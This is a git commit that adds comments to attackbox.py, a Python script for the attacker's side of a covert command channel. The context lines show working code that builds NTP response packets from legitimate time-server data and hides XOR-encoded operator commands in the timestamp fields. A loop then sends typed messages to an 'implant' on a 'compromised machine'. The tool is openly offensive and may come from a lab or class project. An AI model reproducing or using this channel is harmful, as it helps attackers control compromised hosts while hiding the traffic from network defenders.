f88e54c1933cf0494ba473319cba41c6f3188cb6
EEnglish0713 <evanenglish@me.com>
2025-07-27 00:14:17 -0400

    added comments to attackbox.py

--- attackbox.py
+++ attackbox.py
@@ -9,46 +9,61 @@ PRIVATE_KEY_WORD='Bruh'
 PRIVATE_KEY=PRIVATE_KEY_WORD.encode('ascii')
 SLEEP=0
 
+#Function to convert float values to 32-bit fixed-point values
 def pack_fixed32(float_value : float):
     fraction, integer = math.modf(float_value)
     integer = int(integer)
-    fraction = int(fraction * (2**16))
+    fraction = int(fraction * (2**16)) #fraction uses 16 bits of space
     
     #!: Big endian
     #H: unsigned short (2 bytes == 16 bits)
     return struct.pack('!HH', integer, fraction)
 
+#Function to convert float values to 64-bit fixed-point values
 def pack_fixed64(float_value : float):
     fraction, integer = math.modf(float_value)
     integer = int(integer)
     fraction = int(fraction * (2**32))
 
     #!: Big endian
-    #I: unsigned int (4 bytes == 32 bits)
+    #I: unsigned int (4 bytes == 32 bits) #fraction uses 16 bits of space
     return struct.pack('!II', integer, fraction)
 
-def send_ntp_response(sock : socket.socket, client_address : str, client_port : int, data : bytes, last_packet : bool, seqNum : int):
+"""
+Function to send NTP response packets from the attack box to the compromised machine.
 
+Arguments:
+    sock (socket.socket): the UDP socket to send data over
+    client_address (str): the IP address of the compromised machine
+    client_port (int): the port receiving NTP response packets
+    data (bytes): the data to encode within the NTP packet
+    last_packet (bool): indicates the final packet of data to send
+    seqNum (int): indicates the packet's data transmission order
+"""
+def send_ntp_response(sock, client_address, client_port, data, last_packet, seqNum):
+
+    #Get legitimate NTP response data
     c = ntplib.NTPClient()
     response = c.request('time.google.com', version=3)
 
-    #Hard-coded fields
+    #Hard-coded NTP packet fields
     flags = b'\x24'
     peer_clock_stratum = b'\x02'
     peer_polling_interval = b'\x00'
     peer_clock_precision = b'\xe7'
     reference_id = b'\xc2\x79\xcf\xf9'
 
-    #Fixed-32 values
+     #32-bit fixed-point values
     root_delay = pack_fixed32(response.root_delay)
     root_dispersion = pack_fixed32(response.root_dispersion)
 
-    #Fixed-64 values
+    #64-bit fixed-point values
     reference_timestamp = pack_fixed64(response.ref_timestamp)
     origin_timestamp = pack_fixed64(response.orig_timestamp)
     receive_timestamp = bytearray(pack_fixed64(response.recv_timestamp))
     transmit_timestamp = bytearray(pack_fixed64(response.tx_timestamp))
 
+    #Zeroize final two bytes of the receive_timestamp field
     receive_timestamp[7] = 0x00
     receive_timestamp[6] = 0x00
 
@@ -59,7 +74,7 @@ def send_ntp_response(sock : socket.socket, client_address : str, client_port : 
         receive_timestamp[7] |= (length << 1)
         
     else:
-        #Final byte bits: xxxxx110
+        #Final byte's bits: xxxxx110
         receive_timestamp[7] |= (0 << 0)
         receive_timestamp[7] |= (3 << 1)
     
@@ -70,7 +85,7 @@ def send_ntp_response(sock : socket.socket, client_address : str, client_port : 
     # modifying second byte for sequence
     receive_timestamp[7] |= shift & 0xFF
 
-    #Overwrite the final 4 bytes of transmit_timestamp with data
+    #Overwrite the final 4 bytes of transmit_timestamp with xored data
     xored_data = bytes([b ^ k for b, k in zip(data, PRIVATE_KEY)])
     for i in range(0, len(xored_data)):
         transmit_timestamp[i + 4] =  xored_data[i]
@@ -107,7 +122,7 @@ packet, addr = sock.recvfrom(1024)
 client_address = socket.inet_ntoa(packet[:4])
 client_port = struct.unpack('!H', packet[4:6])[0]
 
-
+#Send commands to implant
 while(True):
     message = input("Type your message.\nTo exit, press Enter.\n\n")
     if len(message) == 0:
